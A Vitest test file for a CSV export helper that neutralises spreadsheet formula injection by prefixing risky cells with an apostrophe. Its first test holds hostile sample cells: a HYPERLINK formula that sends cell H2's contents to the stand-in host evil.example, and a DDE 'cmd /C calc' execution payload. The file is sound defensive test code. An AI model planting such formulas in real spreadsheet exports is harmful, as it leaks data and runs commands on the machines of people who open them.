import { describe, expect, it } from 'vitest'
import { csvCell, toCsv } from './csv'

describe('csv cells', () => {
  it('neutralizes formula-like text', () => {
    expect(csvCell('=HYPERLINK("https://evil.example/?d="&H2,"x")')).toBe(`"'=HYPERLINK(""https://evil.example/?d=""&H2,""x"")"`)
    expect(csvCell("+1+cmd|' /C calc'!A0")).toBe("'+1+cmd|' /C calc'!A0")
    expect(csvCell('-2+3')).toBe("'-2+3")
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(csvCell('\tx')).toBe("'\tx")
  })

  it('keeps numbers and plain text as they are', () => {
    expect(csvCell(-1234.5)).toBe('-1234.5')
    expect(csvCell('-1234.50')).toBe('-1234.50')
    expect(csvCell('+63')).toBe('+63')
    expect(csvCell('Dela Cruz, Juan')).toBe('"Dela Cruz, Juan"')
    expect(csvCell(null)).toBe('')
    expect(csvCell('line\r\nbreak')).toBe('"line\r\nbreak"')
  })

  it('joins rows', () => {
    expect(toCsv([['a', 1], ['=b', null]])).toBe("a,1\n'=b,")
  })
})
